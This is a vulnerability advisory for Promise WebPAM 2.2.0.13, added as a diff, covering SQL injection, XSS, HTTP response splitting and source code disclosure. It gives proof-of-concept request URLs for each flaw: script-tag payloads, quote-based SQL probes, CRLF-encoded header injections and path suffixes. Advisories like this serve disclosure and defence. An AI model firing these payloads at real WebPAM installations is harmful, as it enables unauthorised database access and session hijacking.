@@ -1,0 +1,74 @@
+Promise WebPAM v2.2.0.13 Multiple Remote Vulnerabilities
+
+
+Vendor: Promise Technology, Inc.
+Product web page: http://www.promise.com
+Affected version: 2.2.0.13
+
+Summary: WebPAM is a web based Promise Array Management Software
+that's easy-to use, designed to simplify RAID storage management.
+WebPAM is specifically designed for Promise HBA. WebPAM can configure,
+manage or monitor Promise RAID products remotely from a web browser
+from anywhere in the world.
+
+Desc: Input passed via the parameters 'entSortOrder' and 'entSort' in
+'ent_i.jsp' script are not properly sanitised before being returned to
+the user or used in SQL queries. This can be exploited to manipulate SQL
+queries by injecting arbitrary SQL code. The parameters 'startTime' and
+'endTime' in 'ent_i.jsp' are vulnerable to a XSS issue where the attacker
+can execute arbitrary HTML and script code in a user's browser session in
+context of an affected site. The parameter 'userID' in 'usr_ent.jsp' and
+'usr_t.jsp' is vulnerable to HTTP Response Splitting which can be exploited
+to insert arbitrary HTTP headers, which are included in a response sent to
+the user.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Jetty/4.2.23 (Windows XP/5.1 x86 java/1.4.2)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5077
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5077.php
+
+
+28.02.2012
+
+---
+
+
+
+#1 (XSS):
+---------
+
+https://labpc:8443/promise/ent_i.jsp?startTime=<script>alert("ZSL");</script>
+https://labpc:8443/promise/ent_i.jsp?endTime=<script>alert("ZSL");</script>
+
+
+#2 (SQLi):
+----------
+
+https://labpc:8443/promise/ent_i.jsp?entSortOrder=desc%27
+https://labpc:8443/promise/ent_i.jsp?entSort=time%27
+https://labpc:8443/promise/tools/sqlrun.jsp?sqlstr=[QUERY SQLi]
+
+
+#3 (CRLFi):
+-----------
+
+https://labpc:8443/promise/usr_ent.jsp?userID=%0D%0AZSL%2DCustom%2DHeader%3Alove_injection
+https://labpc:8443/promise/usr_t.jsp?userID=%0D%0AZSL%2DCustom%2DHeader%3Alove_injection
+
+
+#4 (SCD):
+---------
+
+Ref: http://secunia.com/advisories/17659
+
+https://labpc:8443/promise/index.jsp%00
+https://labpc:8443/promise/index.jsp%20
+https://labpc:8443/promise/index.jsp%5C
+https://labpc:8443/promise/index.jsp#
+https://labpc:8443/promise/index.jsp\
